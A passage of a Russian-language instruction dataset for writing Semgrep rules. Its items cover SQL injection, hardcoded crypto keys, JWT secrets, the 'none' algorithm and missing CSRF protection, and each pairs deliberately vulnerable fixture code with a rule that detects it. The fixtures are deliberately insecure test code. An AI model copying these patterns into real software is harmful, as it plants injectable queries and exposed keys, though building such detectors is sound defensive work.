      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: tainted-sql-string\nОписание уязвимости: Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as Sequelize which will protect your queries.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: go\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: go\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"encoding/json\"\n\t\"log\"\n\t\"os\"\n\t\"strconv\"\n\n\t\"github.com/aws/aws-lambda-go/events\"\n\t\"github.com/aws/aws-lambda-go/lambda\"\n\t_ \"github.com/go-sql-driver/mysql\"\n)\n\nvar (\n\tdb               *sql.DB\n\terr              error\n\tconnectionString string\n\tdbUser           string\n\tdbPass           string\n\tdataSource       string\n)\n\ntype Employee struct {\n\tEmployeeNo int    `json:\"emp_no\"`\n\tFirstName  string `json:\"first_name\"`\n\tLastName   string `json:\"last_name\"`\n}\n\nfunc init() {\n\tconnectionString = os.Getenv(\"CONN\")\n\tdbUser = os.Getenv(\"DBUSER\")\n\tdbPass = os.Getenv(\"DBPASS\")\n\tdataSource = dbUser + \":\" + dbPass + \"@tcp(\" + connectionString + \")/employees\"\n}\n\nfunc handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {\n\n\tsearchCriteria := request.Body\n\n\tdb, err = sql.Open(\"mysql\", dataSource)\n\tif err != nil {\n\t\tpanic(err.Error())\n\t}\n\n\tdefer db.Close()\n\n\t// ruleid: tainted-sql-string\n\tresults, err := db.Query(\"select e.emp_no, e.first_name, e.last_name \" +\n\t\t\"from employees e, departments d, dept_emp de \" +\n\t\t\"where e.last_name LIKE '\" + searchCriteria + \"%';\")\n\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer results.Close()\n\t// ruleid: tainted-sql-string\n\t_, err = db.Exec(` \n  DELETE FROM table WHERE Id = ` + request.Get(\"Id\"))\n\t// ruleid: tainted-sql-string\n\t_, err = db.Exec(\"DELETE FROM table WHERE Id = \" + request.Get(\"Id\"))\n\n\t// ok: tainted-sql-string\n\tlog.Printf(\"DELETE FROM table WHERE Id = \" + request.Get(\"Id\"))\n\t// ok: tainted-sql-string\n\t_, err = db.Exec(` FAKE\n  DELETE FROM table WHERE Id = ` + request.Get(\"Id\"))\n\n\tidhtml := request.Get(\"Id\")\n\tid, _ := strconv.Atoi(idhtml)\n\n\t// ok: tainted-sql-string\n\t_, err = db.Exec(\"DELETE FROM table WHERE Id = \" + id)\n\n\t// ok: tainted-sql-string\n\tresults2, err2 := db.Query(\"select * from foobar\")\n\n\temployees := make([]Employee, 0)\n\n\tfor results.Next() {\n\t\tvar e Employee\n\n\t\terr := results.Scan(&e.EmployeeNo, &e.FirstName, &e.LastName)\n\t\ti  # Ограничиваем длину\n\nОпасные паттерны:\n• results, err := db.Query(\"select e.emp_no, e.first_name, e.last_name \" +\n\"from employees e, departments d, dept_emp de \" +\n\"where e.last_name LIKE '\" + searchCriteria + \"%';\")\n• _, err = db.Exec(\n  \"DELETE FROM table WHERE Id = \" + request.Get(\"Id\")\n• _, err = db.Exec(\"DELETE FROM table WHERE Id = \" + request.Get(\"Id\")\n\nБезопасные паттерны:  \n• log.Printf(\"DELETE FROM table WHERE Id = \" + request.Get(\"Id\")\n• _ , err = db.Exec(\n  \"FAKE\n  DELETE FROM table WHERE Id = \" + request.Get(\"Id\")\n• idhtml := request.Get(\"Id\")\nid, _ := strconv.Atoi(idhtml)\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  languages: [go]\n  severity: ERROR\n  message: >-\n    Detected user input used to manually construct a SQL string. This is usually\n    bad practice because manual construction could accidentally result in a SQL\n    injection. An attacker could use a SQL injection to steal or modify contents\n    of the database. Instead, use a parameterized query which is available\n    by default in most database engines. Alternatively, consider using an\n    object-relational mapper (ORM) such as Sequelize which will protect your queries.\n  metadata:\n    references:\n    - https://owasp.org/www-community/attacks/SQL_Injection\n    category: security\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    technology:\n    - aws-lambda\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          func $HANDLER($CTX $CTXTYPE, $EVENT $TYPE, ...) {...}\n          ...\n          lambda.Start($HANDLER, ...)\n      - patterns:\n        - pattern-inside: |\n            func $HANDLER($EVENT $TYPE) {...}\n            ...\n            lambda.Start($HANDLER, ...)\n        - pattern-not-inside: |\n            func $HANDLER($EVENT context.Context) {...}\n            ...\n            lambda.Start($HANDLER, ...)\n    - focus-metavariable: $EVENT\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern: |\n            \"$SQLSTR\" + ...\n        - metavariable-regex:\n            metavariable: $SQLSTR\n            regex: (?i)(\\s*select|\\s*delete|\\s*insert|\\s*create|\\s*update|\\s*alter|\\s*drop).*\n      - patterns:\n        - pattern-either:\n          - pattern: fmt.Fprintf($F, \"$SQLSTR\", ...)\n          - pattern: fmt.Sprintf(\"$SQLSTR\", ...)\n          - pattern: fmt.Printf(\"$SQLSTR\", ...)\n        - metavariable-regex:\n            metavariable: $SQLSTR\n            regex: \\s*(?i)(select|delete|insert|create|update|alter|drop)\\b.*%(v|s|q).*\n    - pattern-not-inside: |\n        log.$PRINT(...)\n  pattern-sanitizers:\n  - pattern: strconv.Atoi(...)\n\n\n# Логика правила:\nОбъяснение не сгенерировано\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: go \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "go",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения bad-crypto\nОписание уязвимости: The rule makes sure you are using randomly generated IVs and keys for Crypto calls. Hard-coding these values greatly compromises the security of encrypted data.\nCWE: CWE-321: Use of Hard-coded Cryptographic Key\nТип анализа: search\nЯзык: apex",
    "input": "Требования:\n- Язык: apex\n- Тип анализа: search\n- CWE: CWE-321: Use of Hard-coded Cryptographic Key\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: BadCrypto.cls\n/*\n* Test controller with bad Crypto class usage\n*/\npublic with sharing class BadCrypto {\n\n\tpublic void badCryptoEncryption() {\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedIV = Blob.valueOf('Hardcoded IV 123');\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedKey = Blob.valueOf('0000000000000000');\n\t\tBlob data = Blob.valueOf('Data to be encrypted');\n\t\tBlob encrypted = Crypto.encrypt('AES128', hardCodedKey, hardCodedIV, data);\n\t}\n\n\tpublic void badCryptoEncryptionHarcodedIvOnly() {\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedIV = Blob.valueOf('Hardcoded IV 123');\n\t\t// ok: bad-crypto\n\t\tBlob key = Blob.valueOf(generateEncryptionKey());\n\t\tBlob data = Blob.valueOf('Data to be encrypted');\n\t\tBlob encrypted = Crypto.encrypt('AES128', key, hardCodedIV, data);\n\t}\n\n\tpublic void badCryptoEncryptionHarcodedKeyOnly() {\n\t\t// ok: bad-crypto\n\t\tBlob IV = Blob.valueOf(generateEncryptionIV());\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedKey = Blob.valueOf('0000000000000000');\n\t\tBlob data = Blob.valueOf('Data to be encrypted');\n\t\tBlob encrypted = Crypto.encrypt('AES128', hardCodedKey, IV, data);\n\t}\n\n\tpublic void goodCryptoEncryption() {\n\t\t// ok: bad-crypto\n\t\tBlob IV = Blob.valueOf(getRandomValue());\n\t\t// ok: bad-crypto\n\t\tBlob key = Blob.valueOf(getRandomValue());\n\t\tBlob data = Blob.valueOf('Data to be encrypted');\n\t\tBlob encrypted = Crypto.encrypt('AES128', key, IV, data);\n\t}\n\n\tpublic void badCryptoDecryption() {\n\t\tBlob encryptedCipherText = Blob.valueOf('Some encrypted cipher text');\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedIV = Blob.valueOf('Hardcoded IV 123');\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedKey = Blob.valueOf('0000000000000000');\n\t\tBlob decryptedCipherText = Crypto.decrypt('AES128', hardCodedKey, hardCodedIV, encryptedCipherText);\n\t}\n\n\tpublic void badCryptoDecryptionHarcodedIvOnly() {\n\t\tBlob encryptedCipherText = Blob.valueOf('Some encrypted cipher text');\n\t\t// ruleid: bad-crypto\n\t\tBlob hardCodedIV = Blob.valueOf('Hardcoded IV 123');\n\t\t// ok: bad-crypto\n\t\tBlob key = Blob.va  # Ограничиваем длину\n\nОпасные паттерны:\n• Blob hardCodedIV = Blob.valueOf('Hardcoded IV 123');...Crypto.encrypt('AES128', ..., hardCodedIV, ...);\n• Blob hardCodedKey = Blob.valueOf('0000000000000000');...Crypto.encrypt('AES128', hardCodedKey, ..., ...);\n• Blob hardCodedIV = Blob.valueOf('Hardcoded IV 123');...Crypto.decrypt('AES128', ..., hardCodedIV, ...);\n\nБезопасные паттерны:  \n• Blob IV = Blob.valueOf(getRandomValue());...Crypto.encrypt('AES128', ..., IV, ...);\n• Blob key = Blob.valueOf(getRandomValue());...Crypto.encrypt('AES128', key, ..., ...);\n• Blob IV = Blob.valueOf(generateEncryptionIV());...Crypto.encrypt('AES128', ..., IV, ...);\n\nЛегенда аннотаций:\n- // ruleid:bad-crypto: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bad-crypto: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: bad-crypto\n    min-version: 1.44.0\n    severity: ERROR\n    languages:\n      - apex\n    metadata:\n      cwe:\n      - 'CWE-321: Use of Hard-coded Cryptographic Key'\n      owasp:\n      - A02:2021 - Cryptographic Failures\n      impact: HIGH\n      likelihood: LOW\n      confidence: LOW\n      category: security\n      subcategory:\n      - audit\n      technology:\n      - salesforce\n      references:\n      - https://cwe.mitre.org/data/definitions/321.html\n    message: >-\n      The rule makes sure you are using randomly generated IVs and keys\n      for Crypto calls. Hard-coding these values greatly compromises the\n      security of encrypted data.\n    pattern-either:\n      - pattern: Blob $IV = Blob.valueOf('$STRING');...Crypto.encrypt($ONE, $TWO, $IV, $FOUR);\n      - pattern: Blob $IV = Blob.valueOf('$STRING');...Crypto.decrypt($ONE, $TWO, $IV, $FOUR);\n      - pattern: Blob $KEY = Blob.valueOf('$STRING');...Crypto.encrypt($ONE, $KEY, $THREE, $FOUR);\n      - pattern: Blob $KEY = Blob.valueOf('$STRING');...Crypto.decrypt($ONE, $KEY, $THREE, $FOUR);\n    paths:\n      exclude:\n        - \"*Test*\"\n        - \"*test*\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных значений инициализационных векторов (IV) и ключей шифрования в вызовах методов Crypto.encrypt и Crypto.decrypt. Жесткая кодировка этих значений снижает безопасность зашифрованных данных, так как делает их предсказуемыми и подверженными атакам. Правило использует шаблон, который ищет присвоение значения типа Blob с использованием метода valueOf и последующего вызова методов шифрования или дешифрования. Шаблон либо проверяет наличие жестко закодированного IV, либо жестко закодированного ключа.\n\n# Ключевые элементы:\n- ID: bad-crypto\n- Язык: apex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "bad-crypto",
      "language": "apex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: python.requests.best-practice.use-response-json-shortcut\nОписание уязвимости: The requests library has a convenient shortcut for reading JSON responses, which lets you stop worrying about deserializing the response yourself.\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-response-json-shortcut.fixed.py\nimport json\nimport requests\n\nr = requests.get(\"https://example.org\")\n\n# ok: python.requests.best-practice.use-response-json-shortcut\npayload = r.json()\n\n# ruleid: python.requests.best-practice.use-response-json-shortcut\npayload = r.json()\n\n\n// File: use-response-json-shortcut.py\nimport json\nimport requests\n\nr = requests.get(\"https://example.org\")\n\n# ok: python.requests.best-practice.use-response-json-shortcut\npayload = r.json()\n\n# ruleid: python.requests.best-practice.use-response-json-shortcut\npayload = json.loads(r.text)  # Ограничиваем длину\n\nОпасные паттерны:\n• payload = json.loads(r.text)\n• data = json.loads(response.text)\n\nБезопасные паттерны:  \n• payload = r.json()\n• result = response.json()\n\nЛегенда аннотаций:\n- // ruleid:python.requests.best-practice.use-response-json-shortcut: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:python.requests.best-practice.use-response-json-shortcut: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: python.requests.best-practice.use-response-json-shortcut\n    patterns:\n      - pattern-inside: import json; ...\n      - pattern-inside: import requests; ...\n      - pattern-inside: $RESP = requests.$METHOD(...); ...\n      - pattern: json.loads($RESP.text)\n    fix: $RESP.json()\n    message: >-\n      The requests library has a convenient shortcut for reading JSON responses,\n      which lets you stop worrying about deserializing the response yourself.\n    severity: WARNING\n    metadata:\n      references:\n        - https://requests.readthedocs.io/en/stable/user/quickstart/#json-response-content\n      category: best-practice\n      technology:\n        - requests\n    languages:\n      - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода .text вместо .json() при работе с JSON ответами в библиотеке requests. Анализ выполняется путем поиска последовательностей импортов библиотек json и requests, последующего вызова метода get с последующим использованием json.loads для десериализации текста ответа. Правило рекомендует использовать метод .json(), который предоставляет встроенную поддержку десериализации JSON ответов.\n\n# Ключевые элементы:\n- ID: python.requests.best-practice.use-response-json-shortcut\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "python.requests.best-practice.use-response-json-shortcut",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения missing-csrf-protection\nОписание уязвимости: Detected controller which does not enable cross-site request forgery protections using 'protect_from_forgery'. Add 'protect_from_forgery :with => :exception' to your controller class.\nCWE: CWE-352: Cross-Site Request Forgery (CSRF)\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-352: Cross-Site Request Forgery (CSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: missing-csrf-protection.rb\n# ruleid:missing-csrf-protection\nclass DangerousController < ActionController::Base\n\n  puts \"do more stuff\"\n\nend\n\n# ok:missing-csrf-protection\nclass OkController < ActionController::Base\n\n  protect_from_forgery :with => :exception\n\n  puts \"do more stuff\"\n\nend\n\n# ok:missing-csrf-protection\nclass OkController < ActionController::Base\n\n  protect_from_forgery prepend: true, with: :exception\n\n  puts \"do more stuff\"\n\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• class DangerousController < ActionController::Base\n  puts \"do more stuff\"\nend\n• class AnotherDangerousController < ActionController::Base\n  def index\n    render text: 'Hello World'\n  end\nend\n\nБезопасные паттерны:  \n• class OkController < ActionController::Base\n  protect_from_forgery :with => :exception\n  puts \"do more stuff\"\nend\n• class SafeController < ActionController::Base\n  protect_from_forgery prepend: true, with: :exception\n  puts \"do more stuff\"\nend\n\nЛегенда аннотаций:\n- // ruleid:missing-csrf-protection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-csrf-protection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-csrf-protection\n  patterns:\n  - pattern: |\n      class $CONTROLLER < ActionController::Base\n        ...\n      end\n  - pattern-not: |\n      class $CONTROLLER < ActionController::Base\n        ...\n        protect_from_forgery :with => :exception\n      end\n  - pattern-not: |\n      class $CONTROLLER < ActionController::Base\n        ...\n        protect_from_forgery prepend: true, with: :exception\n      end\n  message: >-\n    Detected controller which does not enable cross-site request forgery\n    protections using 'protect_from_forgery'. Add\n    'protect_from_forgery :with => :exception' to your controller class.\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-352: Cross-Site Request Forgery (CSRF)'\n    owasp:\n    - A01:2021 - Broken Access Control\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/docs/warning_types/cross-site_request_forgery/index.markdown\n    category: security\n    technology:\n    - ruby\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - ruby\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска контроллеров Ruby on Rails, которые не используют защиту от межсайтовых запросов (CSRF) через метод 'protect_from_forgery'. Правило ищет классы контроллеров, которые наследуются от ActionController::Base, но не содержат вызовов 'protect_from_forgery :with => :exception' или 'protect_from_forgery prepend: true, with: :exception'. Паттерны используются для сопоставления классов контроллеров и проверки наличия указанных методов защиты.\n\n# Ключевые элементы:\n- ID: missing-csrf-protection\n- Язык: ruby \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "missing-csrf-protection",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: azure-secret-content-type\nОписание уязвимости: Ensure that key vault secrets have “content_type” set\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-secret-content-type.tf\n# fail\n# ruleid: azure-secret-content-type\nresource \"azurerm_key_vault_secret\" \"example\" {\n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n\n    tags = {\n    environment = \"Production\"\n    }\n}\n\n# pass\nresource \"azurerm_key_vault_secret\" \"example\" {\n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    content_type = \"text\"\n\n    tags = {\n    environment = \"Production\"\n    }\n    expiration_date = \"2020-12-30T20:00:00Z\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    \n    tags = {\n    environment = \"Pr\n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    \n    tags = {\n    environment = \"Pr\n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    \n    some_other_attribute = \"value\"\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    content_type = \"text\"\n    \n    tags\n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    content_type = \"application/json\"\n \n• resource \"azurerm_key_vault_secret\" \"example\" { \n    name         = \"secret-sauce\"\n    value        = \"szechuan\"\n    key_vault_id = azurerm_key_vault.example.id\n    content_type = \"image/png\"\n    \n   \n\nЛегенда аннотаций:\n- // ruleid:azure-secret-content-type: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-secret-content-type: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-secret-content-type\n    message: >-\n      Ensure that key vault secrets have “content_type” set\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_key_vault_secret\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_key_vault_secret\" \"...\" {\n          ...\n          content_type = \"...\"\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Key Vault Secret, которые не имеют атрибута 'content_type'. Анализ выполняется путем поиска шаблона ресурса Azure Key Vault Secret и исключения случаев, когда атрибут 'content_type' явно указан. Правило использует оператор NOT INSIDE для фильтрации безопасных примеров, где атрибут уже присутствует.\n\n# Ключевые элементы:\n- ID: azure-secret-content-type\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-secret-content-type",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: jwt-python-hardcoded-secret\nОписание уязвимости: Hardcoded JWT secret or private key is used. This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets in environment variables)\nCWE: CWE-522: Insufficiently Protected Credentials\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-522: Insufficiently Protected Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-hardcode.py\nimport jwt\n\nsecret_const = \"this-is-secret\"\n\n\ndef bad1():\n    # ruleid: jwt-python-hardcoded-secret\n    encoded = jwt.encode({\"some\": \"payload\"}, \"secret\", algorithm=\"HS256\")\n    return encoded\n\ndef bad1b():\n    # ruleid: jwt-python-hardcoded-secret\n    encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')\n    return encoded\n\n\ndef bad2():\n    # ruleid: jwt-python-hardcoded-secret\n    encoded = jwt.encode({\"some\": \"payload\"}, secret_const, algorithm=\"HS256\")\n    return encoded\n\n\ndef bad3():\n    secret = \"secret\"\n    # ruleid: jwt-python-hardcoded-secret\n    encoded = jwt.encode({\"some\": \"payload\"}, secret, algorithm=\"HS256\")\n    return encoded\n\n\ndef ok(secret_key):\n    encoded = jwt.encode({\"some\": \"payload\"}, secret_key, algorithm=\"HS256\")\n    return encoded  # Ограничиваем длину\n\nОпасные паттерны:\n• encoded = jwt.encode({\"some\": \"payload\"}, \"secret\", algorithm=\"HS256\")\n• encoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')\n• encoded = jwt.encode({\"some\": \"payload\"}, secret_const, algorithm=\"HS256\")\n\nБезопасные паттерны:  \n• encoded = jwt.encode({\"some\": \"payload\"}, secret_key, algorithm=\"HS256\")\n\nЛегенда аннотаций:\n- // ruleid:jwt-python-hardcoded-secret: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:jwt-python-hardcoded-secret: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: jwt-python-hardcoded-secret\n  message: >-\n    Hardcoded JWT secret or private key is used.\n    This is a Insufficiently Protected Credentials weakness: https://cwe.mitre.org/data/definitions/522.html\n    Consider using an appropriate security mechanism to protect the credentials (e.g. keeping secrets\n    in environment variables)\n  metadata:\n    cwe:\n    - 'CWE-522: Insufficiently Protected Credentials'\n    owasp:\n    - A02:2017 - Broken Authentication\n    - A04:2021 - Insecure Design\n    references:\n    - https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/\n    category: security\n    technology:\n    - jwt\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: HIGH\n  patterns:\n  - pattern: |\n      jwt.encode($_, \"...\", ...)\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных секретных ключей или приватных ключей при использовании функции jwt.encode() в Python. Паттерн ищет вызов функции jwt.encode(), где второй аргумент является строкой литерала или переменной, явно содержащей секретный ключ. Это может представлять собой недостаточную защиту учетных данных, так как жестко закодированные секреты могут быть легко обнаружены и использованы злоумышленниками.\n\n# Ключевые элементы:\n- ID: jwt-python-hardcoded-secret\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "jwt-python-hardcoded-secret",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detect-huggingface\nОписание уязвимости: Possibly found usage of AI: HuggingFace\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-huggingface.py\n# ruleid: detect-huggingface\nfrom huggingface_hub import HfApi\n\napi = HfApi()\napi.create_repo(repo_id=\"super-cool-model\")  # Ограничиваем длину\n\nОпасные паттерны:\n• import huggingface_hub\napi = huggingface_hub.HfApi()\napi.create_repo(repo_id=\"super-cool-model\")\n• from huggingface_hub import HfApi\napi = HfApi()\napi.upload_file(path=\"./model.pt\", name=\"my_model.pt\")\n\nБезопасные паттерны:  \n• import os\nprint(os.getcwd())\n• from sklearn import linear_model\nclf = linear_model.LogisticRegression()\n\nЛегенда аннотаций:\n- // ruleid:detect-huggingface: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-huggingface: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-huggingface\n    languages:\n      - python\n    severity: INFO\n    message: \"Possibly found usage of AI: HuggingFace\"\n    pattern-either:\n      - pattern: import huggingface_hub\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных использований библиотеки Hugging Face в Python-коде. Тип анализа — поиск (search). Правило использует шаблон 'pattern' для выявления импорта модуля 'huggingface_hub'. Если импорт найден, выдается предупреждение о возможном использовании AI-моделей от Hugging Face.\n\n# Ключевые элементы:\n- ID: detect-huggingface\n- Язык: python \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-huggingface",
      "language": "python",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: java-jwt-none-alg\nОписание уязвимости: Detected use of the 'none' algorithm in a JWT token. The 'none' algorithm assumes the integrity of the token has already been verified. This would allow a malicious actor to forge a JWT token that will automatically be verified. Do not explicitly use the 'none' algorithm. Instead, use an algorithm such as 'HS256'.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: jwt-none-alg.java\npackage jwt_test.jwt_test_1;\n\nimport com.auth0.jwt.JWT;\nimport com.auth0.jwt.algorithms.Algorithm;\nimport com.auth0.jwt.exceptions.JWTCreationException;\n\npublic class App\n{\n\n    private static void bad1() {\n        try {\n            // ruleid: java-jwt-none-alg\n            Algorithm algorithm = Algorithm.none();\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n    private static void bad2() {\n        try {\n            // ruleid: java-jwt-none-alg\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(Algorithm.none());\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n    private static void ok1(String secretKey) {\n        try {\n            // ok: java-jwt-none-alg\n            Algorithm algorithm = Algorithm.HMAC256(secretKey);\n            String token = JWT.create()\n                .withIssuer(\"auth0\")\n                .sign(algorithm);\n        } catch (JWTCreationException exception){\n            //Invalid Signing configuration / Couldn't convert Claims.\n        }\n    }\n\n    public static void main( String[] args )\n    {\n        bad1();\n        bad2();\n        ok1(args[0]);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: jwt-none-alg.java\nAlgorithm algorithm = Algorithm.none();\nString token = JWT.create().withIssuer(\"auth0\").sign(algorithm);\n• // File: jwt-none-alg.java\nString token = JWT.create().withIssuer(\"auth0\").sign(Algorithm.none());\n\nБезопасные паттерны:  \n• // File: jwt-none-alg.java\nAlgorithm algorithm = Algorithm.HMAC256(secretKey);\nString token = JWT.create().withIssuer(\"auth0\").sign(algorithm);\n\nЛегенда аннотаций:\n- // ruleid:java-jwt-none-alg: Метка для кода, который 